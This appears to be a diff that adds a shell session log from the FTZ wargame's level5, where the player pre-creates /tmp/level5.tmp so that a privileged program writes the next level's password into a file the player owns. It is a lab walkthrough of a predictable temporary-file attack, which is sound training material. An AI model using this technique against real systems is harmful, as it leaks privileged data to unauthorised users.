@@ -1,0 +1,39 @@
+login as: level5
+level5@192.168.35.100's password:
+[level5@ftz level5]$ ll
+total 12
+-rw-r--r--    1 root     root          129 Mar 23  2000 hint
+drwxr-xr-x    2 root     level5       4096 Feb 24  2002 public_html
+drwxrwx---    2 root     level5       4096 Jan 16  2009 tmp
+[level5@ftz level5]$ cat hint
+
+/usr/bin/level5 프로그램은 /tmp 디렉토리에
+level5.tmp 라는 이름의 임시파일을 생성한다.
+
+이를 이용하여 level6의 권한을 얻어라.
+
+
+[level5@ftz level5]$ /usr/bin/level5
+[level5@ftz level5]$ cd /tmp
+[level5@ftz tmp]$ ll
+total 0
+srwxrwxrwx    1 mysql    mysql           0 Dec 21 11:41 mysql.sock
+[level5@ftz tmp]$ cat > level5.tmp
+hhytruth
+
+[1]+  Stopped                 cat >level5.tmp
+[level5@ftz tmp]$ ll
+total 4
+-rw-rw-r--    1 level5   level5          9 Dec 21 12:55 level5.tmp
+srwxrwxrwx    1 mysql    mysql           0 Dec 21 11:41 mysql.sock
+[level5@ftz tmp]$ cd /usr/bin
+[level5@ftz bin]$ level5
+[level5@ftz bin]$ cd /tmp
+[level5@ftz tmp]$ ll
+total 4
+-rw-rw-r--    1 level5   level5         31 Dec 21 12:56 level5.tmp
+srwxrwxrwx    1 mysql    mysql           0 Dec 21 11:41 mysql.sock
+[level5@ftz tmp]$ cat level5.tmp
+next password : what the hell
+[level5@ftz tmp]$
+
